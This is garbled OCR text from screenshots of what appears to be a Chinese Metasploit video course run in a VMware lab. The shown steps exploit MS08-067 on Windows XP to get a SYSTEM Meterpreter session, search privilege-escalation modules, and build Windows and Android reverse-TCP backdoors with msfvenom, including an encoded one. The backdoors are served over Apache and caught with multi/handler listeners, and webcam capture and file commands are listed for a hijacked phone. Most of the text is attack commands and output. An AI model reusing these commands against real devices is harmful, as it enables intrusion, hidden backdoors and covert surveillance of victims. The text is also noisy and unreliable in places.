Shell No.1 文件（F）动作（A） 编辑（E） 齑看（V） 帮助（H）
Exploit target: Id
Name -
0
Automatic Targeting
msf5 exploit(windows/smb/ms08_067_netapi)>set rhosts 192.168.152.140 rhosts 192.168.152.140
msf5 exploit(windows/smb/ms08_067_netapi)> set lport 5555 lport→ 5555
msf5 exploit(windows/smb/ms08_067_netapi) > run
[*]
Started reverse TCP handler on 192.168.152.128:5555
192.168.152.140:445-Automatically detecting the target...
[*]
[*]
192.168.152.140:445- Fingerprint: Windows XP - Service Pack 3 - lang:English
[*]
192.168.152.140:445-Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*]
192.168.152.140:445- Attempting to trigger the vulnerability... 闵闲
Sending stage (176195 bytes) to 192.168.152.140
Meterpreter session 1 opened (192.168.152.128:5555 → 192.168.152.140:1033) at 2020-07-06 14:43:30 +0800 meterpreter > background
[*]Backgrounding session 1...
msf5 exploit(windows/smb/ms08_067_netapf) 

hongkeketang - VMware Workstation
文件D 编项E 查看Y 虚拟机M） 选项卡D 帮动（H）
&
hongkeketang
□Windows Server 2008 R2 x64
Windows XP Professional
Shell No.1
02：43下午
Shel No.1
文件（F） 动作（A） 编辑（E） 查看（V） 帮助（H）
msf5 exploit(windows/smb/ms08_067_netapi) > set lport 5555 msf5 exploit(windows/smb/ms08_067_netapi) > run
lport→5555
[*] Started reverse TCP handler on 192.168.152.128:5555
[*] 192.168.152.140:445 - Automatically detecting the target...
[*] 192.168.152.140:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 192.168.152.140:445-Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 192.168.152.140:445 - Attempting to trigger the vulnerability...
[*]
Sending stage (176195 bytes) to 192.168.152.140
[*] Meterpreter session 1 opened (192.168.152.128:5555 → 192.168.152.140:1033) at 2020-07-06 14:43:30 +0800 l
meterpreter > background
[*] Backgrounding session 1…..
msf5 exploit(windows/smb/ms08_067_netapi) > sessions
Active sessions
---------------
Id
Name
Type
Information
Connection
92.168.152.140) 1
meterpreter x86/windows NT AUTHORITY\SYSTEM a ADMIN-C584843A5 192.168.152.128:5555 → 192.168.152.140:1033 (1
msf5 exploit(windows/smb/ms08_067_netapi) >
OBS 25.0.8 (64-b
新建标篮页—个人一
视频
hongkeketang-
35.Metasploit:



hongkeketang - VMware Workstation
文件旧 编城E） 查看Y 虚拟机M） 选项卡D 帮助（H）
hongkeketang
□Windows Server 2008 R2 x64
Windows XP Professional
Shell No.1
02：44下午
Chell No 1
文件（F） 动作（A） 编辑（E） 查看（V） 帮助（H）
[*]
Backgrounding session 1…..
msf5 exploit(windows/smb/ms08_067_netapi) > sessions
Active sessions
----
Id Name Type
Information
Connection
meterpreter x86/windows NT AUTHORITY\SYSTEM a ADMIN-C584B43A5 192.168.152.128:5555 → 192.168.152.140:1033 (1 92.168.152.140)
1
msf5 exploit(windows/smb/ms08_067_netapi) > search 14-002
Matching Modules
----------------
#
Name
Disclosure Date Rank
Check
Description
0 exploit/windows/local/bthpan
2014-07-18
average
Yes
MS14-062 Microsoft Bluetooth Personal Area Network
ing (BthPan.sys) Privilege Escalation
1 exploit/windows/local/ms_ndproxy lege Escalation
2013-11-27
average
Yes
MS14-002 Microsoft Windows ndproxy.sys Local Privi
msf5 exploit(windows/smb/ms08_067_netapi) >
I
OBS 25.0.8 (64-bi
新建标签页—个人
视频
hongkeketang
35.Metasploit:



hongkeketang-VMware Workstation
02：44下午
■G Shel No.1
文件（F） 动作（A） 编辑（E） 查看（V） 帮助（H）
msf5 exploit(windows/smb/ms08_067_netapi)>sessions Active sessions
Name
Type
Information
Connection PI
-- 1
meterpreter x86/windows
NT AUTHORITY\SYSTEM @ ADMIN-C584B43A5
192.168.152.128:5555→192.168.152.140:1033 (1 92.168.152.140)
msf5 exploit(windows/smb/ms08_067_netapi)> search 14-002 Matching Modules
# Name
Disclosure Date
Rank
Check
Description -
0 exploit/windows/local/bthpan
2014-07-18
average
Yes
MS14-062 Microsoft Bluetooth Personal Area Network ing (BthPan.sys) Privilege Escalation
1 exploit/windows/local/ms_ndproxy
2013-11-27
average
Yes
MS14-002
Microsoft Windows ndproxy.sys Local Privi lege Escalation
msf5 exploit(windows/smb/ms08_067_netapi)>use exploit/windows/local/bthpan 

hongkeketang-VMware Workstation
编辑（E）
戴工
Shell No.1
Shel No.1 文件（F）动作（A）
編辑（E） 查看（V）
帮助（H）
Payload options (windows/meterpreter/reverse_https): Name
Current Setting
Required
Description ----
EXITFUNC
thread
yes
Exit technique (Accepted: '', seh, thread, process, none) LHOST
192.168.152.128
yes
The local listener hostname LPORT
8443
yes
The local listener port LURI
no
The HTTP Path Exploit target:
PI
Name --
0
Windows XP SP3
msf5 exploit(windows/local/bthpan)>
msf5 exploit(windows/local/bthpan)> set session 1 session →1
msf5 exploit(windows/local/bthpan)> set payload windows/meterpreter/reverse_tcp payload =windows/meterpreter/reverse_tcp
I msf5 exploit(windows/local/bthpan)>



hongkeketang·VMware Workstation
Shell No.1
Shel No.1 文件（F）动作（A）编辑（E） 查看（V） 帮助（H）
Payload options (windows/meterpreter/reverse_https): Name
Current Setting
Required
Description EXITFUNC
thread
yes
Exit technique (Accepted: '', seh, thread, process, none) LHOST
192.168.152.128
yes
The local listener hostname LPORT
8443
yes
The local listener port LURI
no
The HTTP Path Exploit target:
PI
Name 一
0
Windows XP SP3
msf5 exploit(windows/local/bthpan)>
msf5 exploit(windows/local/bthpan)>set session 1 session →1
msf5 exploit(windows/local/bthpan)> set payload windows/meterpreter/reverse_tcp payload →windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/bthpan)> set lport 6666 lport → 6666
I msf5 exploit(windows/local/bthpan)



eketang·VMware Workstation
X 编辑（E）
首页
板売模板
35．Metasploit：■权．docx
36．Metasploit．．etasploit生成后门
37．Metasplit：生成Android后门 x
hongkeketang
三文件
安全 开发工具 特色功能 Q查找
已间步·＆协作分享
✓
··
X■切
Calibri（正文）
AaBbC AaBbCcDc
AaBbCcD
AaBbCcDd 粘贴
格式期
BIU·A·xxA
标题4 HTML.. 普通（网站） 默认段... 新样式
文档助手 文字工具
壹找慧换·选择·
·
文件（F） 动作
G川 SESS
meterpreter Payload
Name
Windows 7 提权 EXIT
LHOS
exploit/windows/local/ms13_053_schlamperei LPOF
exploit/windows/local/ms13_081_track_popup_menu Exploit
PI - 0 msf5 ex Sta
[*]
[-] Exp Expcorc
[*]
msf5 exploit(windows/local 

-VMware Workstation
X 福売模板
ongkeketa ng 民■ 三文件
安全 开发工具 特色功能 Q查找
已同步·＆协作分享
✓: 宋体
A··田
AaBbC AaBbCcDc
AaBbCcD AaBbCeDd B
IU·A·XX
标题4 HTML.. 普通（网站）
文档助手 文字工具
查找？换·选择 回收站
Metasploit：使用Metasploit生成后门 文件系统
支持哪些后门
I 主文件夹
Windows 后门 Linux 后门
Java 后门 Kali Linux
amd641
PHP 后门 Android 后门 等等
生成Windows 后门
msfvenom -p windows/meterpreter/reverse_tcp 1host=192.168.152.128 lport=5555 -f exe -o/home/kali/payload.exe
88 页码：1 页面：1／2 节：1／1 设置值：21.2厘米 行：6 列：1 字数：203 拼写检查 文科校对



36.Me
用Metasploit生成后门
237．Metasploit：生成Android后门
+ 三文件
开始 插入
引用 审岡
章节 安全 开发工具 特色功能
Q查找 x剪切
宋体
母··女閏閏·出出·OAA
AaBbCcDd
AaBb AaBbC AaBbC 格式期
BIU-A·XxA··A·A
正文 标■1 标■2 标题3 新样式
文档助手 文字工具
查找？换选择 ■■
PHP后门
田· 回收站
Android 后门 等等
文件系统 主文件夹
生成Windows后门
msfvenom -p windows/meterpreter/reverse_tcp 1host=192.168.152.128 Kali Linux
1port=5555 -f exe -o/home/kali/payload.exe amd641
msfvenom -p windows/meterpreter/reverse_tcp 1host=192.168.152.128 lport=5555-i 3-e x86/shikata_ga_nai -f exe -o/home/kali/payload.exe Msfvenom
msfvenom--list archs
查看支持的系统架构 Imsfvenom--list platforms
查看支持系统平台
88 页例：1 页面：1／2 节：1／1 设置值：12.9厘米 行：16 列：59 字数：27／203 拼写检查 文档校对
连续播放
高清
倍速 

hongkeketang-VMware Workstation
文件 编辑E
首页 hongkeketang
临売横板
36.Metasploit, etasploit生成后门
37.Metasploit:生成Android后门
shigua
三文件、
开始
页国布局
引用
章节
安全
开发工具
特色功能
Q查找
已同步·色协作 凸分享
×切
·小四
A'A
AaBbC AaBbCcDc AaBbCcD AaBbCcDd
AA
文件（F） 动作
粘贴
0复 格式期
A
HTML
普通（网站） 默认段...
新样式·文档助手 文字工具·查找替换·选择
hong
生成Windows 后门
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168. 152. 128 lport=5555 -f exe -o /home/kali/payload.exe
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.152.128 lport=5555-i 3 -e x86/shikata_ga_nai -f exe -o /home/kali/payload. exe
Msfvenom
msfvenom --list archs msfvenom --list platforms
查看支持的系统架构
查看支持系统平台
msfvenom -I payload
查看所有可用的 payload
木千七的大山的
页保1页圈：1/2 节：1/1 设置值：11.2厘米
行： 13 孙：44
字数： 203
拼写检查
国文档校对
200%
OBS 25.0.8 (64-b
视频
hongkeketang
36.Metasploit:



ceketang·VMware Workstation
X 编辑（E）
首页
板売模板
36．Metasploit＿etaploit生成后门
37．Metasploit：生成Android后门
+ hongkeketang
✓ 三文件
章节 安全 开发工具 特色功能 Q直找
已间步·＆协作分享 田·奈··
X剪切
炒供
AaBbC AaBbCcDc
AaBbCcD AaBbCeDd 动作
·:
标■4 HTML.. 普通（网站） 默认段...
世
文档助手 文字工具
壹找？換·选择· Msfvenom
+
msfvenom--list archs
查看支持的系统架构 msfvenom--list platforms
查看支持系统平台 msfvenom-I payload
查看所有可用的payloadmsfvenom-I formats
查看所有的输出格式 msfvenom-I encrypt
查看所有的加密方式 msfvenom-I encoders I
查看所有的编码器
88 设查值：12.9厘米
行：16 列：38
字数：2／203拼写检查

hongkeketang·VMware Workstation
文件F 编辑（E） 查看（V）
选项卡① 帮助（H）
hongke@kali:~
hongke-文件管理器
02：55下午
O■G hongkr@bali:-
文件（F）动作（A）编辑（E）
査看（V）
帮助（H） hongke@kali:-
hongke@kall:~
hongke@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.152.128 lport=5555 -f exe -o /home/hongke/windwos_ payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload Payload size: 341 bytes
Final size of exe file:73802 bytes
Saved as:/home/hongke/windwos_payload.exe hongkeakali:~$ sudo service apache2 start ［sudo］ hongke 的密码：
hongke@kali:~$
I 

eketang-VMware Workstation
x 首页
稻売模板
36．Metasploit．etasploit生成后门
37．Metasploit：生成Android后门
+ hongkeketang
三文件
章节 安全 开发工具 特色功能 Q直找
✓ X■切
E·A··田
AaBbC AaBbCcDc
B导·＆ D AaBbCcD
AaBbCeDd 文件（F）
动作
复制 格式期
BIU·A·XXA·■·
·
标■4 HTML... 普通（网站） 默认段..
文档助手 文字工具
查找替換·选择 打开metasploit 执行以下命令，开启主控端监听
世 XMMMMI
.WMMMM dMMN
msf5> use exploit/multi/handler CWN
msf5 exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp payload →windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler)>set lhost 192.168.152.148 lhost192.168.152.148
msf5 exploit(multi/handler)> set lport 5555 lport→5555
msf5 exploit(multi/handler)> run
[*] Started reverse TCP handler on 192.168.152.148:5555 +
+
Back
Search
Favorites +
Address
88 Metasp
页码：1
页面：1／2 节：1／1 设查值：24.6厘米 行：30 列：28
字数：9／203
☑拼写检查 msf5



·VMware Workstation
夜神模拟器6.6.0.9■页
■売模板
37.Metasploit: ongkeketang
安全 开发工具 特色功能 Q查找
已同步·＆作分享
··. 宋体
·A··田
AaBbCcDd
AaBb AaBbC AaBbC 田·
正文 标■1
标■3
文档助手 文字工具
壹找醫换 回收站
世
Metasploit：生成Android后门 文件系统
实验靶机：安卓模拟器主文件夹
生成安卓后门
sudo msfvenom -p android/meterpreter/reverse_tcp 1host=192.168.3.190 Kali Linux
amd641
1port=5555 R>/home/kali/payload.apk
I 利用安卓后门
开启 metasploit
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp set lhost 192.168.3.190
set lport 5555
页码：1 页面：1／1 节：1／1 设置值：7.9厘米 行：8孙7 字数：93 拼写检查 文档校对
200% 云上城之歌
毒液单职业
三国志幻想大陆三国志战略版

hongkeketang
hongke@kali:
hongke@kali:
hongke-文件管理器 文件（F）
编辑（E）
(Ethernet) 文件系统
0 Kali Linux am..
公共
视频
图片
0
collisions 0 桌面
回收站
文档 文档
音乐 女田著 视频
android_payload.a
windwos_payload. 下载
pk
exe
hongke@kall:- 网络
文件（F）动作（A）编辑（E） 查看（V） 帮助（H）浏览网络
hongke@kali:~$ sudo service apache2 start 10个项目：82.0KiB（83，990字节），可用空（
［sudo］ hongke 的密码：
collisions 0 0
hongke@kali:~$ ls hongke@kali:~$ msfvenom -p
公共 模板 视频
图片
文档
卞载
音乐
桌面
android_payload.apk windwos_payloa oid_payload.apk
hongk [-] No platform was selecte
Ssf:Modules: Platform:sAndroid from the payload [-] No arch selected, selec ing arch
blyak From the payLoad No encoder specified, outpu
Payload size: 10188 bytes hongke@kali:~$



nox 夜神模拟器6.6.0.9
Android 5 选项卡
http://192.168.3.207/ hongke@kali:~
hongke-文件
Index of/ hongke@bli-
文件（F） 編辑（E）
Last modified
书 Name
Size Description (Ethernet)
수
版 1.png
2020-06-06 02:33 1.8M 文件系统
0
?new.apk
2020-06-12 15:31 111M Kali Linux am...
windows.exe 2020-06-06 01:59 72K
文件助手 公共
视频 白
Apache/2.4.43 (Debian) Server at 192.168.3.207 Port 80 hongke
0
collisions 0
安装APK 桌面
D 回收站
文档
多开器 文档
音乐
关闭应用 图片
视频
android_payload.a
windwos_payload. ？下载
pk
exe 网络
浏览网络
0 10个项目：82.0KiB（83，990字节），可用空间：92.6GIB
0 collisions 0 hongke@kali:~$ msfvenom -p android/meterpreter/reverse_tcp lhost=192. oid_payload.apk
[-] No platform was selected, choosing Msf::Module::Platform::Android [-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload Payload size: 10188 bytes
hongke@kali:~$ 

hongkeketang-VMware Workstation
夜神模拟器 6.6.0.9
ndroid s
×
文件D 编项E 查看凹 出拟机（M） 选项卡D 帮动（H）
03:14
hongkeketang
□Windows Server 2008 R2 x64
GWindows XPProfessional
192.168.3.229
[hongke@kali: ~]
hongke@kali:~
hongke — 文件管理器
Index of /
健位设置
hongke—文件管理器
hongke@kali-
hd Sia Dencrieton
文件（F） 编辑（E） 视图（V） 转到（G） 帮助（H）
4
音量加
/home/hongke/
2dt nadat a0k 20000700151419w EL 2025-67061457 72
Ethernet)
Apache/2443 (Doun) Server at 192. 168.3229 Port 80
d-
设备
音量减
文件系统
Kali Linux am
文件助手
位置
公共
模板
视频
图片
hongke
桌面
D
v
安装APK
0
collisions 0
回收站文档
文档
下载
音乐
桌面
多开器
音乐
关闭应用
图片
APK
视频
下载
android_payload.a windwos_payload.
exe
网络
浏览网络
10 个项目：82.0 KIB（83，990 字节），可用空间：92.6 GIB
collisions 0
hongke@kali:~$ msfvenom -p android/meterpreter/reverse_tcp lhost=192. oid_payload.apk
andr
[-] No platform was selected, choosing Msf::Module::Platform::Android
[-] No arch selected, selecting arch: dalvik from the payload No encoder specified, outputting raw payload
Payload size: 10188 bytes
hongke@kali:~$
OBS 25.0.8 (64-b
课程内容
hongkeketang
37.Metasploit： 生
0
夜神模拟器



□
首页
39．Metaspl．卓手机，上传下载文件
40．Metasp．．．．安卓手机，实现定位开始
插入 页面布局
章节
开发工具 特色功能 Q查找
:
^ Calibri（正文
五号
·AAQ安·
E·E·A··田
AaBbCcDd
E期·＆等G论 AaBb AaBb(AaBbC
BIU-A·xxA··A·A··日
正文 标题1 标题2 标题3 新样式
文档助手 文字工具
查找替换·选择 格式■
ten Metasploit：远程控制安卓手机，调用摄像头拍照
keH I
ase webcam＿chat 开始视频聊天
webcam＿list 列出网络摄像头
webcam＿snap 从指定的网络摄像头拍摄快照webcam＿snap 参数：
-h：显示帮助。
i：要使用的网络摄像头的索引号。
—p：JPEG图像文件路径。默认为HOME／［随机乱码名字］.jpeg—q：JPEG图像质量，默认为“50”。
—v：自动查看JPEG图像，默认为“true”。
webcam＿stream 从指定的网络摄像头播放视频流安全建议
页码：1 页图：1／1 ■：1／1 设置值：5.1厘米 行：3 列1 字数180 拼写检查
文档校对 

首页
39．Metaspl．．■手机，上传下载文件x
40．Metaspl．．制安卓手机。实现定位章节
安全
Q查找
已同步·＆协作 分享
: 田
AaBbCcDd
AaBb AaBb( AaBbC 日
正文 标题1 标题2 标题3
文档助手 文字工具·
查找替换 Metasploit：远程控制安卓手机，上传下载文件
文件系统命令 Command
Description cat
读取并输出到标准输出文件的内容cd
更改目录
检索文件的校验和 checksum
将源复制到目标 cp
88 页码：1 页？：1／2 野：1／1 设置值：5.6厘米 行：3列1
字数：221 拼写检查文档校对
02目の 
